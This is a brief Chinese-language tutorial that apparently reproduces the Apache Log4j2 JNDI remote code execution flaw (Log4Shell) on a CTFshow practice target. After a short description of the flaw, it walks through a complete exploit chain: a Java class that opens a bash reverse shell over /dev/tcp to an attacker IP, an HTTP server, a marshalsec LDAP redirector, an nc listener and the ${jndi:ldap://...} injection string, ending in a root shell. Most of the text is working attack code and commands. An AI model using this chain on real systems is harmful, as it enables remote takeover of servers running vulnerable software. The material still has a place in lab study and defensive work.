1 漏洞描述

    Apache Log4j2是一款优秀的Java日志框架。2021年11月24日，阿里云安全团队向Apache官方报告了Apache Log4j2远程代码执行漏洞。由于Apache Log4j2某些功能存在递归解析功能，攻击者可直接构造恶意请求，触发远程代码执行漏洞。漏洞利用无需特殊配置，经阿里云安全团队验证，Apache Struts2、Apache Solr、Apache Druid、Apache Flink等均受影响。

2 漏洞复现
（1）构造EXP，修改IP，反弹一个shell
import java.lang.Runtime;import java.lang.Process;
publicclass Exp {    static {        try {            Runtime rt = Runtime.getRuntime();            String[] commands = {"bash", "-c", "bash -i >& /dev/tcp/ip/12000 0>&1"};            Process pc = rt.exec(commands);            pc.waitFor();        } catch (Exception e) {            // do nothing        }    }}
（2）编译class，最好本地编译，用其他环境编译好的怕会出现不兼容的情况
java Exp.java
（3）在编译好的class的目录下开启http服务
python -m SimpleHTTPServer 80

（4）使用java 反序列化利用工具 marshalsec实现转发，IP换成自己的IP
java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer "http://ip/#Exp" 9999

（5）nc开启监听命令
nc -lvvp 12000

（6）这里使用CTFshow的靶场进行复现，注意端口为9999
${jndi:ldap://x.x.x.x:9999/Exp}

（7）点击提交，成功反弹shell，权限root
